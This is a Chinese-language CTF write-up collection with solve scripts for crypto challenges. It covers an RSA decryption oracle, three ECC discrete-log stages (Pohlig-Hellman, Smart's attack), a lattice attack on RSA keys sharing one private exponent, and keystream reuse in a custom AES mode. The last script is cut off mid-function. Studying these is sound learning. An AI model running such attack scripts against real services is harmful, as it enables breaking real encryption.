\u0026#39;)) io.sendline(\u0026#39;1\u0026#39;) print(io.recvuntil(\u0026#39;Your cipher: \u0026#39;)) io.sendline(str(n)) return io.recvline()[:-1] def bigger(mid,c): # tmp1 = pow(mid,e,n) # ic(tmp1) tmp = (c*pow(mid,e,n))%n print(tmp) # ic(padding) m = dec(tmp) ic(m) if(m!=b\u0026#39;0000\u0026#39;): return True else: return False io=remote(\u0026#39;0.0.0.0\u0026#39;,10001) # print(io.recv(1024)) io.recvuntil(\u0026#39;PKCS1_v1_6?(y/n)\u0026#39;) io.sendline(\u0026#39;n\u0026#39;) e = int(CatNum(io.recvline())[0]) n = int(CatNum(io.recvline())[0]) c = int(CatNum(io.recvline())[0]) ic(e,c,n) \u0026#39;\u0026#39;\u0026#39;估算padding范围 padding = 1 h = 0 for i in range(512): tmp1 = pow(padding,e,n) ic(tmp1) tmp = (c*tmp1)%n print(tmp) ic(padding) m = dec(tmp) ic(m,i) if(m!=b\u0026#39;0000\u0026#39;): h=i input() break padding *= 2 \u0026#39;\u0026#39;\u0026#39; # pad=240~260 pl = 2**200 ph = 2**496 mid= (pl+ph)//2 input() for i in range(512): # tmp = m*mid # ic(tmp-n) if(bigger(mid,c)==True): ph=mid-1 mid = (mid+pl)//2 else: pl=mid+1 mid =(mid+ph)//2 # print(mid) # input() ic(mid) n=2**496 s =n//mid secret = long_to_bytes(s) ic(secret) ic(secret.hex()) print(io.recvuntil(\u0026#39;Your choice: \u0026#39;)) io.sendline(\u0026#39;2\u0026#39;) io.sendline(secret.hex()) sleep(0.5) print(io.recv(1024)) b\u0026#39;Your choice: \u0026#39; b\u0026#34;You know my secret? (in hex): b\u0026#39;flag{ba1f2511fc30423bdbb183fe33f3dd0f}\u0026#39;\\n\u0026#34; [*] Closed connection to 0.0.0.0 port 10001   /mnt/c/U/16953/Desktop/twoBytes took  11s at  11:38:42 AM ❯ document for 5th space2021 # 唯一以有点意思的找最短向量问题（SVP）听说一堆非预期打烂了，能找到的wp全是非预期（笑🤣 感觉不如。。。。画质\nECC # 三段ECC的套娃，一看就是找老年赛棍出的缝合题，记了没用 不记又不行\nTask\nprint \u0026#39;Try to solve the 3 ECC\u0026#39; from secret import flag from Crypto.Util.number import * assert(flag[:5]==\u0026#39;flag{\u0026#39;) flag = flag[5:-1] num1 = bytes_to_long(flag[:7]) num2 = bytes_to_long(flag[7:14]) num3 = bytes_to_long(flag[14:]) def ECC1(num): p = 146808027458411567 A = 46056180 B = 2316783294673 E = EllipticCurve(GF(p),[A,B]) P = E.random_point() Q = num*P print E print \u0026#39;P:\u0026#39;,P print \u0026#39;Q:\u0026#39;,Q def ECC2(num): p = 1256438680873352167711863680253958927079458741172412327087203 #import random #A = random.randrange(389718923781273978681723687163812) #B = random.randrange(816378675675716537126387613131232121431231) A = 377999945830334462584412960368612 B = 604811648267717218711247799143415167229480 E = EllipticCurve(GF(p),[A,B]) P = E.random_point() Q = num*P print E print \u0026#39;P:\u0026#39;,P print \u0026#39;Q:\u0026#39;,Q factors, exponents = zip(*factor(E.order())) primes = [factors[i] ^ exponents[i] for i in range(len(factors))][:-1] print primes dlogs = [] for fac in primes: t = int(int(P.order()) / int(fac)) dlog = discrete_log(t*Q,t*P,operation=\u0026#34;+\u0026#34;) dlogs += [dlog] print(\u0026#34;factor: \u0026#34;+str(fac)+\u0026#34;, Discrete Log: \u0026#34;+str(dlog)) #calculates discrete logarithm for each prime order print num print crt(dlogs,primes) def ECC3(num): p = 0xd3ceec4c84af8fa5f3e9af91e00cabacaaaecec3da619400e29a25abececfdc9bd678e2708a58acb1bd15370acc39c596807dab6229dca11fd3a217510258d1b A = 0x95fc77eb3119991a0022168c83eee7178e6c3eeaf75e0fdf1853b8ef4cb97a9058c271ee193b8b27938a07052f918c35eccb027b0b168b4e2566b247b91dc07 B = 0x926b0e42376d112ca971569a8d3b3eda12172dfb4929aea13da7f10fb81f3b96bf1e28b4a396a1fcf38d80b463582e45d06a548e0dc0d567fc668bd119c346b2 E = EllipticCurve(GF(p),[A,B]) P = E.random_point() Q = num*P print E print \u0026#39;P:\u0026#39;,P print \u0026#39;Q:\u0026#39;,Q ECC1(num1) print \u0026#39;==============\u0026#39; ECC2(num2) print \u0026#39;==============\u0026#39; ECC3(num3) stage1 # 很明显给的这几个数很小，用sage自带的离散对数求解三件套梭一遍得到答案\np = 146808027458411567 A = 46056180 B = 2316783294673 E = EllipticCurve(GF(p),[A,B]) P = E(119851377153561800,50725039619018388) Q = E(22306318711744209, 111808951703508717) n = discrete_log(Q, P, operation=\u0026#39;+\u0026#39;) print(n) # 13566003730592612 stage2 # 考烂的CRT in ECC知识点\n一半特征是E.order()分解出来的素因子有问题，一般特征就是前面的因子都不大，后面有一个很大的因子\n同时你还可以知道n其实也不是太大，E.order()就是ECC的阶，意思就是这整个ECC的曲线上一共有多少个不同的离散的点\nrefer：\nblueHat final PicoCTF 2017: ECC2 某领航杯被py烂的题 p = 1256438680873352167711863680253958927079458741172412327087203 a = 377999945830334462584412960368612 b = 604811648267717218711247799143415167229480 gx = 550637390822762334900354060650869238926454800955557622817950 gy = 700751312208881169841494663466728684704743091638451132521079 px = 1152079922659509908913443110457333432642379532625238229329830 py = 819973744403969324837069647827669815566569448190043645544592 E = EllipticCurve(GF(p), [a, b]) G = E(gx, gy) n = E.order() QA = E(px, py) factors = list(factor(n)) m = 1 moduli = [] remainders = [] print(f\u0026#34;[+] Running Pohlig Hellman\u0026#34;) print(factors) for i, j in factors: if i \u0026gt; 10**9: print(i) break mod = i**j g2 = G*(n//mod) q2 = QA*(n//mod) r = discrete_log(q2, g2, operation=\u0026#39;+\u0026#39;) remainders.append(r) moduli.append(mod) m *= mod r = crt(remainders, moduli) print(r) # 16093767336603949 # 9-2521- stage3 # E.order() = p的时候 可以用一个叫做SMART攻击的操作\n去年学的时候见到过，但换电脑搞没了，索性在记录一遍\np = 0xd3ceec4c84af8fa5f3e9af91e00cabacaaaecec3da619400e29a25abececfdc9bd678e2708a58acb1bd15370acc39c596807dab6229dca11fd3a217510258d1b A = 0x95fc77eb3119991a0022168c83eee7178e6c3eeaf75e0fdf1853b8ef4cb97a9058c271ee193b8b27938a07052f918c35eccb027b0b168b4e2566b247b91dc07 B = 0x926b0e42376d112ca971569a8d3b3eda12172dfb4929aea13da7f10fb81f3b96bf1e28b4a396a1fcf38d80b463582e45d06a548e0dc0d567fc668bd119c346b2 E = EllipticCurve(GF(p),[A,B]) P = E(10121571443191913072732572831490534620810835306892634555532657696255506898960536955568544782337611042739846570602400973952350443413585203452769205144937861,8425218582467077730409837945083571362745388328043930511865174847436798990397124804357982565055918658197831123970115905304092351218676660067914209199149610) Q = E(964864009142237137341389653756165935542611153576641370639729304570649749004810980672415306977194223081235401355646820597987366171212332294914445469010927,5162185780511783278449342529269970453734248460302908455520831950343371147566682530583160574217543701164101226640565768860451999819324219344705421407572537) def SmartAttack(P,Q,p): E = P.curve() Eqp = EllipticCurve(Qp(p, 2), [ ZZ(t) + randint(0,p)*p for t in E.a_invariants() ]) P_Qps = Eqp.lift_x(ZZ(P.xy()[0]), all=True) for P_Qp in P_Qps: if GF(p)(P_Qp.xy()[1]) == P.xy()[1]: break Q_Qps = Eqp.lift_x(ZZ(Q.xy()[0]), all=True) for Q_Qp in Q_Qps: if GF(p)(Q_Qp.xy()[1]) == Q.xy()[1]: break p_times_P = p*P_Qp p_times_Q = p*Q_Qp x_P,y_P = p_times_P.xy() x_Q,y_Q = p_times_Q.xy() phi_P = -(x_P/y_P) phi_Q = -(x_Q/y_Q) k = phi_Q/phi_P return ZZ(k) r = SmartAttack(P, Q, p) print(r) # 19597596255129283097357413993866074145935170485891892 # 4a81-9957-8c3381622434 Document for 东华ber2021 # py大赛 诸神黄昏，依旧是抽一中午午休记一下题\nThersa # 又是一个考烂的水题\nsrc\nfrom Crypto.Util.number import* from hashlib import sha256 import socketserver import signal import string import random from secret import flag table = string.ascii_letters+string.digits flag = bytes_to_long(flag) MENU = br\u0026#39;\u0026#39;\u0026#39;[+] 1.Get Encrypt: [+] 2.Exit: \u0026#39;\u0026#39;\u0026#39; class Task(socketserver.BaseRequestHandler): def _recvall(self): BUFF_SIZE = 2048 data = b\u0026#39;\u0026#39; while True: part = self.request.recv(BUFF_SIZE) data += part if len(part) \u0026lt; BUFF_SIZE: break return data.strip() def send(self, msg, newline=True): try: if newline: msg += b\u0026#39;\\n\u0026#39; self.request.sendall(msg) except: pass def recv(self, prompt=b\u0026#39;[-] \u0026#39;): self.send(prompt, newline=False) return self._recvall() def proof_of_work(self): proof = (\u0026#39;\u0026#39;.join([random.choice(table)for _ in range(20)])).encode() sha = sha256( proof ).hexdigest().encode() self.send(b\u0026#34;[+] sha256(XXXX+\u0026#34; + proof[4:] + b\u0026#34;) == \u0026#34; + sha ) XXXX = self.recv(prompt = b\u0026#39;[+] Plz Tell Me XXXX :\u0026#39;) if len(XXXX) != 4 or sha256(XXXX + proof[4:]).hexdigest().encode() != sha: return False return True def EncRy(self): p,q = getPrime(512),getPrime(512) n = p * q phi = (p - 1) * (q - 1) e = inverse(self.d, phi) c = pow(flag, e, n) return(e,n,c) def handle(self): signal.alarm(60) if not self.proof_of_work(): return self.send(b\u0026#34;Welcome to my RSA!\u0026#34;) self.d = getPrime(random.randint(435, 436)) while 1: self.send(MENU) self.send(b\u0026#34;Now!What do you want to do?\u0026#34;) option = self.recv() if option == b\u0026#39;1\u0026#39;: self.send(str(self.EncRy()).encode()) else: break self.request.close() class ThreadedServer(socketserver.ThreadingMixIn, socketserver.TCPServer): pass class ForkedServer(socketserver.ForkingMixIn, socketserver.TCPServer): pass if __name__ == \u0026#34;__main__\u0026#34;: HOST, PORT = \u0026#39;0.0.0.0\u0026#39;, 10004 print(\u0026#34;HOST:POST \u0026#34; + HOST+\u0026#34;:\u0026#34; + str(PORT)) server = ForkedServer((HOST, PORT), Task) server.allow_reuse_address = True server.serve_forever() 所有的密文都是通过 $d$ 去产生实现的,common private key 攻击\nrefer：\nSctf2020 rsa vn公开赛factor(印象中是叫这个) 根据实际情况应该是可以获取$N$组 再照着样例\n改改参数大小使其满足题目要求和论文给的范围即可\nsolve # #sagemath from Crypto.Util.number import * from gmpy2 import iroot e1,n1,c1=(42930516866813661342965746223080520747639541783178165319930798466029922118238472375394025163017796792784301240279788973937514266651107411418409008126879890591634663600650622272276047586523991529128830751549916767006347857754606279093837920255744001556692088644997689518547315534397835105708024032114104233381, 77791057667316752688491344909349631143733665781985333450578141862483326292146944912417154290062439390262044781769179125790833684914883275144238169619259170245799297149721759503884049470266984858779855785527134093827380541390671671421065142834758715718012985245418556303458870683285396736465075774918756943849, 27391282824232696321494182390733866553767929957526280387298565758936575846502788790274502139115326807546265156509536800727262991966913839267428385697513824611497066201158201419561518562486879276509945503450941372856450148181065616319630297566761526958666976256485612007573889257294374864202830099675167224618) e2,n2,c2=(19018427406275508266725318182604693048036959850117857989040747866263767206396699322550948080332092809132375761217132996919018670944100226583113345224541762253472497934634295339952030040768111601599444464038423922436192382234875739639531699502158126381323466372283051777517214602215819494796932567681821951661, 79650072081042322662491093415989067423342888043380140123956989961183485888095357404757819859263343837741065918473041502132392064045360290315160760995892876549211580451883428599900857896989098491504167023490425266678783550124590746460833416198860457961338080633882718390420924183342764921882749848062331837157, 47371054845953307458071281584547821822800567401012561479295024891414125620585367467768382853051493673297474227621983913977611690329004811247719468085248653560735761224575841708898687339051979667968682445741679494814049520035089826802489552786717808162007554429409373562206869161512981004103668781786261071642) e3,n3,c3=(56543738058355787650458463296434379628548490866377456720748305513368031407432713681493384526759984858874833739323541806113831186630548095096957902346105190080635673052132358289744367039154224900185478860894300958278206372821874050674031918453348499825234769506256225325221089605204424199863739802675837768205, 79745878045239534073349506401894614077391259818245570439963094062152853043757431813193065050329923218395626939202508409314449221246402655169069682907439636880572885333431797158404833511447487493689075229003167933950464179409482597295179818105362744282535280033320439360295379327350145598779754591726149053127, 8406272869509814810291187732784177513812310985481896410437026715571367365909106171597609902128681517191154832846694541582315046341089395251486352127008536629880180333790535980063006233315170237788757595367545197059456798192233574190206607791108247915315239293315856045620536743732064060419019383653017754432) e4,n4,c4=(7084543689346197121827870073257673792657047196994323608218552636377497641605010832530473677981880825830062575269956770329035892637961925305684535520357897676757195804280616332451896105146968442795337854851958165225390355543144975973394614878012047483478453541789213191489356453542050105788672267671186622349, 84193779290507365404703859402732143439109001210124769414375603074891153195964512465635919253078833439745459555371587096356222637979782540883867956964113419688015746698472168356238337484900265019835855499846392509934587316309130977694018626484013012355408173625138875013785514921191427955103949196185104270953, 57188209081624431651145335231083235968076151504975133709205719008833316979899965113559550632823577949531094733328627686996343950189156687337540064474041791342122016380351392782138752676861412964076387375179224936788921872659232295048921383561342206164767267043862968315447568792822076799329961025512641107246) e5,n5,c5=(42832642928335275352734567465034497040617823999922718556444541540637575945318881858516365030723712293566938969239323128990546490351954020139702168583195387467822779475617077682710213996418869245088581793014583647801408719774140042233362914483058594181044708264940880873371340427513033621237883600041744259821, 100914764703986796503524746926824107407478498950896766954709765945739896574588237451261683044947676026816706250675210414995572771552251740398776761522312876711308663303631592599847201703544166011694904414367791567937596616962437750298179607007543994344224571625128530174980427056520743554240699599606017732453, 21119798060505043638458066841637396779462197838711219768901795233508035124251444985142140372296435557972489164083922904128749582124708137219016012302886951596946166275929450048887248788479585841059063956921630092232393741155010454512377332292347344811575552765907485744387780176768333870372377008256136186807) e6,n6,c6=(92302858091592048530164341892874939881833483518095068563859833484262743798872223903571012516471302801063982503961657026303472815350321491051234131656128422061238653211376015684800612577226731646341043305151595034538237258802687294046312571159904343739248977644957644677771388548256577367489970379574172464797, 117679207537303828303181692131284163456980142622326819854887578740836701695007074712199364783113450072522001526705110176578644797269399966145551464701075583136732122232247312391436901027876012971338176518412247421456590394727819899354372288058334724615114926953982773216858342784870874502568283116049857599697, 694728970163274338952272545132120395722399912878027385515433411574332882874655233664187165540396449753083157039600465154030742189987900065124001404191085619372639241055402339355981737758090185934672051842827196968679043511560501886410676350912217561099905662581686696249610217183042166978654689061472935255) e7,n7,c7=(107958832210740007280315466139290077026935359625782760172740000594364460869128124940009236566874443252250812468875065019322671201219651761405497245501179554045401769228061173131905805679002507830926816675819378142336365243119257538909791638758850962854709130774816448647965771903108760260693930942445832581613, 124514631670412396955583333186310036282392256402221528788219590875160132086163249366732298557562280446982290995056571347900001555142302304165284003543211879382117786568833925378625035366897845326134848510307881296792070242801270087606140027163068970890264029919788362871312210162525628755395528824620664275981, 122802204066940916090785459557228909264312462241661083272739613123469038467287559936112649653314041478655145859464338716094314561339632033669065696677349425900229495594900454878607113262204411164149182327233978867883052370242620750529133958835635598563284037235210030872798337887481034016325891031269539006959) e8,n8,c8=(93032879096884833976354856506992993862316449685244948137669996162571278621479404733170084750947866321488473290655001676203288675188640293830346141700535957251408373865922564197265494466697836691672035371673758770683433485891640334014710181418750508413205768593981082149070901287189919968858883490943111987181, 126814261604881133528727989048158217150888497288150533655112145843950045425282139821602599229665745129453799945609742281626549287640177663087578340721569938344685390347348772958990014616194819409373556039354672378457009008450988307789399181204535224407248419395946571885338535639198634359608298711433536942733, 95330490027741440826424434337219961367405797139516869535055648011514837588374299753114991801669135223731470401046346436845011624597842223950760050976711965720535288001750040424144530196787933771814541562581236974965361143703635725068380670591839954283253531181890717506164459934317393787888216914582168459996) sqrn8=iroot(n8,2)[0] M=[ [sqrn8,e1,e2,e3,e4,e5,e6,e7,e8], [0,-n1,0,0,0,0,0,0,0], [0,0,-n2,0,0,0,0,0,0], [0,0,0,-n3,0,0,0,0,0], [0,0,0,0,-n4,0,0,0,0], [0,0,0,0,0,-n5,0,0,0], [0,0,0,0,0,0,-n6,0,0], [0,0,0,0,0,0,0,-n7,0], [0,0,0,0,0,0,0,0,-n8] ] M=matrix(ZZ,M) M=M.LLL() if M[0][0]\u0026lt;0: M=-M d,t1=M[0][0]//sqrn8,M[0][1] k1=(d*e1-t1)//n1 s1=(t1-1)//k1-1 var(\u0026#39;x\u0026#39;) F=x^2-s1*x+n1 p,q=F.roots()[0][0],F.roots()[1][0] p,q=abs(p),abs(q) d=inverse_mod(Integer(e1),(Integer(p)-1)*(Integer(q)-1)) print(long_to_bytes(pow(c1,d,n1))) #b\u0026#39;flag{338f4482-4f11-496c-a0d7-b06df53f79c5}\u0026#39; BlockEncrypt # 原文给了个pyc，但是复盘就懒得解包了捏\nsrc\nfrom Crypto.Util.number import* from Crypto.Cipher import AES from secret import flag from my_encrypt import block_encrypt from hashlib import sha256 import socketserver import signal import string import random import os table = string.ascii_letters+string.digits MENU = br\u0026#39;\u0026#39;\u0026#39;[+] 1.Encrypt the Flag: [+] 2.Encrypt your Plaintext: [+] 3.Exit: \u0026#39;\u0026#39;\u0026#39; def pad(m): padlen = 16 - len(m) % 16 return m + padlen * bytes([padlen]) def xor(msg1,msg2): assert len(msg1)==len(msg2) return long_to_bytes(bytes_to_long(msg1)^bytes_to_long(msg2)) class Task(socketserver.BaseRequestHandler): def _recvall(self): BUFF_SIZE = 2048 data = b\u0026#39;\u0026#39; while True: part = self.request.recv(BUFF_SIZE) data += part if len(part) \u0026lt; BUFF_SIZE: break return data.strip() def send(self, msg, newline=True): try: if newline: msg += b\u0026#39;\\n\u0026#39; self.request.sendall(msg) except: pass def recv(self, prompt=b\u0026#39;[-] \u0026#39;): self.send(prompt, newline=False) return self._recvall() def proof_of_work(self): proof = (\u0026#39;\u0026#39;.join([random.choice(table)for _ in range(20)])).encode() sha = sha256( proof ).hexdigest().encode() self.send(b\u0026#34;[+] sha256(XXXX+\u0026#34; + proof[4:] + b\u0026#34;) == \u0026#34; + sha ) XXXX = self.recv(prompt = b\u0026#39;[+] Plz Tell Me XXXX :\u0026#39;) if len(XXXX) != 4 or sha256(XXXX + proof[4:]).hexdigest().encode() != sha: return False return True def enc_msg(self,msg): return block_encrypt(pad(msg),self.key,self.ivv) def handle(self): signal.alarm(50) if not self.proof_of_work(): return self.ivv = os.urandom(16) self.key = os.urandom(16) while 1: self.send(MENU,newline = False) option = self.recv() if (option == b\u0026#39;1\u0026#39;): self.send(b\u0026#34;My Encrypted flag is:\u0026#34;) self.send(self.enc_msg(flag)) elif option == b\u0026#39;2\u0026#39;: self.send(b\u0026#34;Give me Your Plain \u0026amp; I\u0026#39;ll give you the Cipher.\u0026#34;) plaintext = self.recv() self.send(b\u0026#39;PlainText:\u0026#39; + plaintext + b\u0026#39;\\nCipherText:\u0026#39; + self.enc_msg(plaintext)) else: break self.send(b\u0026#34;\\n[.]Down the Connection.\u0026#34;) self.request.close() class ThreadedServer(socketserver.ThreadingMixIn, socketserver.TCPServer): pass class ForkedServer(socketserver.ForkingMixIn, socketserver.TCPServer): pass if __name__ == \u0026#34;__main__\u0026#34;: HOST, PORT = \u0026#39;0.0.0.0\u0026#39;, 10004 print(\u0026#34;HOST:POST \u0026#34; + HOST+\u0026#34;:\u0026#34; + str(PORT)) server = ForkedServer((HOST, PORT), Task) server.allow_reuse_address = True server.serve_forever() api my_encrypt.py\nfrom Crypto.Util.number import * Sbox = ( 0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76, 0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0, 0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15, 0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75, 0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84, 0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF, 0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8, 0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2, 0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73, 0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB, 0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79, 0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08, 0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A, 0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E, 0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF, 0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16, ) InvSbox = ( 0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB, 0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB, 0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E, 0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25, 0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92, 0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84, 0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06, 0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B, 0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73, 0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E, 0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B, 0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4, 0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F, 0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF, 0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61, 0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D, ) xc = lambda a: (((a \u0026lt;\u0026lt; 1) ^ 0x1B) \u0026amp; 0xFF) if (a \u0026amp; 0x80) else (a \u0026lt;\u0026lt; 1) R = ( 0x00, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1B, 0x36, 0x6C, 0xD8, 0xAB, 0x4D, 0x9A, 0x2F, 0x5E, 0xBC, 0x63, 0xC6, 0x97, 0x35, 0x6A, 0xD4, 0xB3, 0x7D, 0xFA, 0xEF, 0xC5, 0x91, 0x39, ) def t2m(text): text = bytes_to_long(text) matrix = [] for i in range(16): byte = (text \u0026gt;\u0026gt; (8 * (15 - i))) \u0026amp; 0xFF if i % 4 == 0: matrix.append([byte]) else: matrix[i // 4].append(byte) return matrix def m2t(matrix): text = 0 for i in range(4): for j in range(4): text |= (matrix[i][j] \u0026lt;\u0026lt; (120 - 8 * (4 * i + j))) return long_to_bytes(text) class myAES: def __init__(self, MasterKey): self.ChangeKey(MasterKey) def ChangeKey(self, MasterKey): self.RoundKeys = t2m(MasterKey) # print self.RoundKeys for i in range(4, 4 * 11): self.RoundKeys.append([]) if i % 4 == 0: byte = self.RoundKeys[i - 4][0] \\ ^ Sbox[self.RoundKeys[i - 1][1]] \\ ^ R[i // 4] self.RoundKeys[i].append(byte) for j in range(1, 4): byte = self.RoundKeys[i - 4][j] \\ ^ Sbox[self.RoundKeys[i - 1][(j + 1) % 4]] self.RoundKeys[i].append(byte) else: for j in range(4): byte = self.RoundKeys[i - 4][j] \\ ^ self.RoundKeys[i - 1][j] self.RoundKeys[i].append(byte) # print self.RoundKeys def encrypt(self, plaintext): self.plain_state = t2m(plaintext) self.__add_round_key(self.plain_state, self.RoundKeys[:4]) for i in range(1, 10): self.__round_encrypt(self.plain_state, self.RoundKeys[4 * i : 4 * (i + 1)]) self.__sub_bytes(self.plain_state) self.__shift_rows(self.plain_state) self.__sub_bytes(self.plain_state) self.__add_round_key(self.plain_state, self.RoundKeys[40:]) return m2t(self.plain_state) def __add_round_key(self, s, k): for i in range(4): for j in range(4): s[i][j] ^= k[i][j] def __round_encrypt(self, state_matrix, key_matrix): self.__sub_bytes(state_matrix) self.__shift_rows(state_matrix) self.__mix_columns(state_matrix) self.__add_round_key(state_matrix, key_matrix) def __sub_bytes(self, s): for i in range(4): for j in range(4): s[i][j] = Sbox[s[i][j]] def __shift_rows(self, s): s[0][1], s[1][1], s[2][1], s[3][1] = s[1][1], s[2][1], s[3][1], s[0][1] s[0][2], s[1][2], s[2][2], s[3][2] = s[2][2], s[3][2], s[0][2], s[1][2] s[0][3], s[1][3], s[2][3], s[3][3] = s[3][3], s[0][3], s[1][3], s[2][3] def __mix_single_column(self, a): # please see Sec 4.1.2 in The Design of Rijndael t = a[0] ^ a[1] ^ a[2] ^ a[3] u = a[0] a[0] ^= t ^ xc(a[0] ^ a[1]) a[1] ^= t ^ xc(a[1] ^ a[2]) a[2] ^= t ^ xc(a[2] ^ a[3]) a[3] ^= t ^ xc(a[3] ^ u) def __mix_columns(self, s): for i in range(4): self.__mix_single_column(s[i]) def xor(a,b): assert len(a) == len(b) tmp = [] for i in range(len(a)): tmp.append(a[i]^b[i]) return bytes(tmp) def exchange_plain(plaintext): new_plain = [] for i in plaintext: new_plain.append(i\u0026lt;\u0026lt;1) new_plain = bytes(new_plain) return new_plain def block_encrypt(plaintext,key,iv): aes = myAES(key) block = len(plaintext)//16 new_plain = exchange_plain(plaintext) cipher = b\u0026#39;\u0026#39; for i in range(block): iv = aes.encrypt(iv) cipher += xor(iv,new_plain[16*i:16*i+16]) return cipher 这道题，给出的块加密使用的 key 和 iv 都是在初始化阶段内容中就已经固定了的，在一次连接之中不会更改\n连上去可以获得flag的密文，那么如果是CFB或者OFB模式的加密那么该题违反了一次一密的(OTP)原则\n对于密钥流复用，我们一点点试就可以了\nOFB\nCFB\n总的来说，都是\n的形式\nsolve # from pwn import * from Crypto.Util.number import * from hashlib import sha256 import string from pwnlib.util.iters import mbruteforce table = string.ascii_letters+string.digits def pow(): io.recvuntil(\u0026#34;XXXX+\u0026#34;) suffix = io.recv(16).decode(\u0026#34;utf8\u0026#34;) io.recvuntil(\u0026#34;== \u0026#34;) cipher = io.recvline().strip().decode(\u0026#34;utf8\u0026#34;) proof = mbruteforce(lambda x: sha256((x + suffix).encode()).hexdigest() == cipher, table, length=4, method=\u0026#39;fixed\u0026#39;) io.sendlineafter(\u0026#34;XXXX :\u0026#34;, proof) def pad(m): padlen = 16 - len(m) % 16 return m + padlen * bytes([padlen]) def enc(plaintext): print(io.recvuntil(b\u0026#39;[-]\u0026#39;).decode()) io.sendline(b\u0026#34;2\u0026#34;) print(io.recvuntil(b\u0026#39;[-] \u0026#39;).decode()) io.sendline(plaintext) io.recvuntil(b\u0026#34;CipherText:\u0026#34;) c = io.recvuntil(b\u0026#39;[+]\u0026#39;)[:-4] return c def xor(msg1,msg2): assert 